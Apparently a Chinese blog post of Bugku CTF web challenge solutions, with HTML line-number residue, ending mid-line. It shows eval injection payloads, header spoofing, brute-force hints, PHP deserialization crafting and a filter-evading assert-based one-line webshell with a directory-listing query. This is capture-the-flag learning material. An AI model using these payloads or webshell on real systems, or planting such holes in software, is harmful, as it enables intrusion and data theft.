class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>web2</span><br><span class="line">	听说聪明的人都能找到答案</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/web2/</span></span><br><span class="line">	CTRL + u 查看源代码</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>计算器</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/yanzhengma/</span></span><br><span class="line">	改一下字符输入长度的限制</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>web基础$_GET</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/get/</span></span><br><span class="line">	?<span class="keyword">var</span>=val</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>web基础$_POST</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/get/index1.php</span></span><br><span class="line">	直接用BurpSuite改包，注意先改为POST request</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>矛盾</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/get/index1.php</span></span><br><span class="line">	$num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">	<span class="keyword">if</span>(!is_numeric($num)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $num;</span><br><span class="line">		<span class="keyword">if</span>($num == <span class="number">1</span>)  </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	此处 == 为弱类型判断，num = <span class="number">1</span>e ，num == <span class="number">1</span></span><br><span class="line">	</span><br><span class="line"><span class="number">6.</span>web3</span><br><span class="line">	flag就在这里快来找找吧</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/web3/</span></span><br><span class="line">	直接查看源码，得&amp;<span class="comment">#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;</span></span><br><span class="line">	&amp;<span class="comment">#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</span></span><br><span class="line">	扔到 Burp 解码试试，解为html得flag</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>域名解析</span><br><span class="line">	听说把 flag.bugku.com 解析到<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span> 就能拿到flag</span><br><span class="line">	两种办法：<span class="number">1.</span>直接改本机 host 文件</span><br><span class="line">			  <span class="number">2.</span>访问时将请求头中的 host 改为flag.bugku.com</span><br><span class="line">	然而我两种办法都失败了，显示域名没备案，哈哈哈</span><br><span class="line">	</span><br><span class="line"><span class="number">8.</span>你必须让他停下</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/web12/</span></span><br><span class="line">	页面不断的自动刷新，用Burp拦截，一张图一张图看，源代码中蕴含了 flag</span><br><span class="line">	</span><br><span class="line"><span class="number">9.</span>本地包含</span><br><span class="line">	<span class="meta">&lt;?php</span> </span><br><span class="line">		<span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">		$a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// @ 可屏蔽报错信息的显示</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);   <span class="comment">// eval() 漏洞</span></span><br><span class="line">		show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	show_source() 对文件进行语法高亮</span><br><span class="line">	hello=<span class="number">1</span>);show_source(<span class="string">'flag.php'</span>);var_dump(</span><br><span class="line">	最终解释为：</span><br><span class="line">	var_dump(<span class="number">1</span>);show_source(<span class="string">'flag.php'</span>);var_dump(show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">	</span><br><span class="line"><span class="number">10.</span>变量<span class="number">1</span></span><br><span class="line">	flag In the variable ! </span><br><span class="line">	<span class="meta">&lt;?php</span>  </span><br><span class="line">		error_reporting(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">		highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">			$args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">			<span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	通过 <span class="keyword">include</span> 或 <span class="keyword">require</span> 语句，可以将 PHP 文件的内容插入另一个 PHP 文件</span><br><span class="line"></span><br><span class="line">	<span class="comment">// preg_match() 正则表达式匹配函数</span></span><br><span class="line"></span><br><span class="line">	/^\w+$/</span><br><span class="line"></span><br><span class="line">	两个<span class="comment">//表示开始和结束</span></span><br><span class="line">	^表示开始字符串</span><br><span class="line">	$表示结束字符串</span><br><span class="line">	\w表示包含【a-z，A-Z, _ , <span class="number">0</span><span class="number">-9</span>】</span><br><span class="line">	+表示一个或者多个\w</span><br><span class="line"></span><br><span class="line">	var_dump()显示一个或多个表达式的结构信息，包括表达式的类型与值。</span><br><span class="line">	数组将递归展开值，通过缩进显示其结构</span><br><span class="line"></span><br><span class="line">	<span class="keyword">eval</span>()存在命令执行漏洞，我们是想查看flag1.php中的flag，</span><br><span class="line">	首先想到的是本地包含漏洞，查看源码，或者上传一句话木马等思路</span><br><span class="line">	但是条件判断加了正则表达式判断，过滤了括号和引号等字符。</span><br><span class="line">	PHP 在 $GLOBALS[index] 数组中存储了所有全局变量，数组的键值为变量名</span><br><span class="line"></span><br><span class="line">	$$args = $($args)</span><br><span class="line"></span><br><span class="line">	$$ --&gt; 可变变量，允许动态改变一个变量名称</span><br><span class="line">	$name = <span class="string">"trans"</span>;</span><br><span class="line">	$trans = <span class="string">"You can see me"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $name.&lt;br&gt;;</span><br><span class="line">	<span class="keyword">echo</span> $$name;</span><br><span class="line"></span><br><span class="line">	------------</span><br><span class="line">	结果:</span><br><span class="line">		trans</span><br><span class="line">		You can see me</span><br><span class="line">		</span><br><span class="line"><span class="number">11.</span>web5</span><br><span class="line">	JSPFUCK??????答案格式CTF&#123;**&#125;</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/web5/</span></span><br><span class="line">	查看源代码可得：([][(![]+[])[+[]] 这种加密过后的 js 代码，直接扔到 console 跑一下就出来</span><br><span class="line">	</span><br><span class="line"><span class="number">12.</span>头等舱</span><br><span class="line">	老办法，先看源代码，源代码还是啥也没有，看看请求头，找到了</span><br><span class="line">	</span><br><span class="line"><span class="number">13.</span>网站被黑</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/webshell/</span></span><br><span class="line">	这个题没技术含量但是实战中经常遇到</span><br><span class="line">	扫一下后台，找到后门，Burp 爆破就看到了</span><br><span class="line">	</span><br><span class="line"><span class="number">14.</span>管理员系统</span><br><span class="line">	特别突出的是 非本地IP访问，直接改个 X-Forwarded-<span class="keyword">For</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>，然后再爆破</span><br><span class="line">	X-Forwarded-<span class="keyword">For</span>:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。</span><br><span class="line">	它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。</span><br><span class="line">	标准格式如下：X-Forwarded-<span class="keyword">For</span>: client1, proxy1, proxy2</span><br><span class="line">	HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，</span><br><span class="line">	告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理</span><br><span class="line">	</span><br><span class="line"><span class="number">15.</span>web4</span><br><span class="line">	<span class="keyword">var</span> p1 = ----;</span><br><span class="line">	<span class="keyword">var</span> p2 = ----;</span><br><span class="line">	<span class="keyword">eval</span>(unescape(p1) + unescape(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br><span class="line">									<span class="comment">// 54aa2</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> a = document.getElementById(<span class="string">"password"</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line">				<span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">			alert(<span class="string">"Error"</span>);</span><br><span class="line">			a.focus();</span><br><span class="line">			<span class="keyword">return</span> !<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br><span class="line">	明显发现有一段被 base64 加密过，解码可得</span><br><span class="line">	</span><br><span class="line"><span class="number">16.</span>输入密码查看flag</span><br><span class="line">	http:<span class="comment">//123.206.87.240:8002/baopo/</span></span><br><span class="line">	目录提示使用爆破，<span class="number">5</span>位数密码？？？</span><br><span class="line">	纯数字！！！</span><br><span class="line">	</span><br><span class="line"><span class="number">17.</span>点击一百万次</span><br><span class="line">	<span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">	$(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	  $(<span class="string">"#cookie"</span>)</span><br><span class="line">		.mousedown(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		  $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">		&#125;)</span><br><span class="line">		.mouseup(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		  $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">		  clicks++;</span><br><span class="line">		  $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">		  <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">			<span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line">						<span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line">						<span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">						$(<span class="string">'body'</span>).append(form);</span><br><span class="line">						form.submit();</span><br><span class="line">		  &#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	观察得，若clicks &gt;= <span class="number">1000000</span> 则执行下面的提交表单，</span><br><span class="line">	索性直接 post 好了</span><br><span class="line">	</span><br><span class="line"><span class="number">18.</span>过狗一句话</span><br><span class="line">	<span class="meta">&lt;?php</span> </span><br><span class="line">	$poc = <span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">	$poc_1 = explode(<span class="string">"#"</span>,$poc);   </span><br><span class="line">	<span class="comment">// explode(separator,string,limit) 函数把字符串打散为数组</span></span><br><span class="line">	$poc_2 = $poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">	$poc_2($_GET[<span class="string">'s'</span>]) </span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	bool assert ( mixed $assertion [, Throwable $exception ] )</span><br><span class="line">	<span class="comment">// 若assertion为字符串，则assertion将会被当做php代码执行，与eval()类似</span></span><br><span class="line">	http:<span class="comment">//120.24.86.145:8010/?s=print_r(scandir('./'));</span></span><br><span class="line">	print_r() 函数用于打印变量，以更容易理解的形式展示</span><br><span class="line">	scandir(directory,sorting_order,context) 函数返回指定目录中的文件和目录的数组</span><br><span class="line">	print_r(scandir(<span class="string">'./'</span>))  <span class="comment">// 打印所有目录</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># Welcome to bugku</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">	$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">	$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">	<span class="comment">// file_get_contents() 把整个文件读入一个字符串中</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">		<span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">	&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	这个题遇到很多骚办法，暂时还不会做</span><br><span class="line">	博客 ：https:<span class="comment">//blog.csdn.net/csu_vc/article/details/78375203</span></span><br><span class="line">		   https:<span class="comment">//blog.csdn.net/yh1013024906/article/details/81087939</span></span><br><span class="line">	php 伪协议</span><br><span class="line">	php:<span class="comment">//filter</span></span><br><span class="line">	php:<span class="comment">//input</span></span><br><span class="line">	<span class="comment">// ROIS恰好也有这道题，暗示我多做题？？</span></span><br><span class="line">	<span class="comment">// 构造序列化，注意类名Read</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		<span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">			<span class="keyword">public</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		$a = <span class="keyword">new</span> Read();</span><br><span class="line">		$a-&gt;file = <span class="string">"f1a9.php"</span>;</span><br><span class="line">		$a = serialize($a);</span><br><span class="line">		print_r($a);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">		$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">		$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">		$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</span><br><span class="line">				<span class="keyword">exit</span>();</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">				$pass = unserialize($pass);</span><br><span class="line">				<span class="keyword">echo</span> $pass;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 各种绕过</span></span><br><span class="line">	<span class="meta">&lt;?php</span> </span><br><span class="line">		highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">		$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);   <span class="comment">// 将URL解码</span></span><br><span class="line">		$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">			<span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line">				<span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">				<span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line">		&#125; </span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	先将 id URL编码 %<span class="number">6</span>d%<span class="number">61</span>%<span class="number">72</span>%<span 